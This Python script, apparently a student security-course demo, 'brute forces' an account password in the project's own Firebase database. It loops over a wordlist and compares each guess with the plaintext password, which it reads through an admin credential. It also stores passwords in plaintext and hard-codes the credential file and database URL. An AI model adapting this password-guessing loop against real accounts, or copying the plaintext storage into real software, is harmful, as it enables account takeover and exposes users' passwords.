import os.path, sys, firebase_admin, time
from firebase_admin import db

cred_obj = firebase_admin.credentials.Certificate('cyber-security-project-9d147-firebase-adminsdk-kohge-efdf8dfb2a.json')
default_app = firebase_admin.initialize_app(cred_obj, {
    'databaseURL': 'https://cyber-security-project-9d147-default-rtdb.asia-southeast1.firebasedatabase.app/'
})

ref = db.reference("/accounts")

if sys.version_info[0] != 3:
    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
    fb.py\n\t--------------------------------------''')
    sys.exit()

PASSWORD_FILE = "brute_force_password_list.txt"
MIN_PASSWORD_LENGTH = 4

def isThisAPassword(email, password):
    response = ref.order_by_child("email").equal_to(email).get()
    email_password = response.popitem(last=False)[1]['password']

    if password == email_password:
        return True
    return False

if __name__ == "__main__":
    print("------ Starting Brute Force Attack ------")

    if not os.path.isfile(PASSWORD_FILE):
        print("Password file: ", PASSWORD_FILE, " does not exist!")
        sys.exit(0)
    
    password_data = open(PASSWORD_FILE, 'r').read().split("\n")

    print("Password file selected: ", PASSWORD_FILE)

    email = input("Enter email to target: ").strip()

    start = time.time()

    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()

        if len(password) > MIN_PASSWORD_LENGTH:
            print("Trying password [", index, "]: ", password)
            if isThisAPassword(email, password):
                end = time.time()
                print("Execution time in seconds: ", (end - start))
                break